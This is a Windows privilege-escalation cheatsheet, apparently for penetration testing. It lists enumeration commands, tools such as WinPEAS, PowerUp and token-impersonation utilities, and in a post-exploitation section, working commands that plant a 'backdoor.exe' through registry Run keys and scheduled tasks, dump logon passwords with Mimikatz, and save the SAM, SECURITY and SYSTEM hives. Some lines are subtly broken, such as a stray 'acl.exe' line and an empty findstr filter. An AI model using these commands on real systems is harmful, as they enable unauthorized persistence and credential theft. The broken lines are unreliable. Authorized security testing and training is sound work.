# Windows Privilege Escalation Cheatsheet

## System Information Gathering

### Basic System Info
```cmd
systeminfo
hostname
echo %USERNAME%
whoami
whoami /priv
whoami /groups
```

### Network Information
```cmd
ipconfig /all
arp -a
route print
netstat -ano
```

## User and Group Enumeration

### Local Users
```cmd
net user
net localgroup
net localgroup administrators
wmic useraccount get name,sid
```

### Domain Information
```cmd
net user /domain
net group /domain
net group "Domain Admins" /domain
```

## Service Enumeration

### Running Services
```cmd
sc query
wmic service list brief
tasklist /svc
```

### Service Permissions
```cmd
acl.exe 
 icacls "C:\path\to\service.exe"
sc qc [service_name]
```

## Registry Keys to Check

### AlwaysInstallElevated
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Stored Credentials
```cmd
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

## File System Enumeration

### World Writable Directories
```cmd
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
```

### Unquoted Service Paths
```cmd
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v ""
```

### Scheduled Tasks
```cmd
schtasks /query /fo LIST /v
```

## Automated Tools

### PowerUp (PowerSploit)
```powershell
Import-Module PowerUp.ps1
Invoke-AllChecks
```

### WinPEAS
```cmd
winpeas.exe
```

### Sherlock
```powershell
Import-Module Sherlock.ps1
Find-AllVulns
```

## Common Exploits

### Token Impersonation
- Check for SeImpersonatePrivilege
- Use JuicyPotato, PrintSpoofer, or RoguePotato

### DLL Hijacking
- Look for missing DLLs in PATH
- Check writable directories in system PATH

### Kernel Exploits
- Use Windows-Exploit-Suggester
- Check systeminfo output against known exploits

## Post-Exploitation

### Persistence
```cmd
# Registry Run Keys
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\temp\backdoor.exe"

# Scheduled Tasks
schtasks /create /tn "MyTask" /tr "C:\temp\backdoor.exe" /sc onlogon
```

### Credential Dumping
```cmd
# Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# reg save
reg save hklm\sam c:\temp\sam.save
reg save hklm\security c:\temp\security.save
reg save hklm\system c:\temp\system.save
```
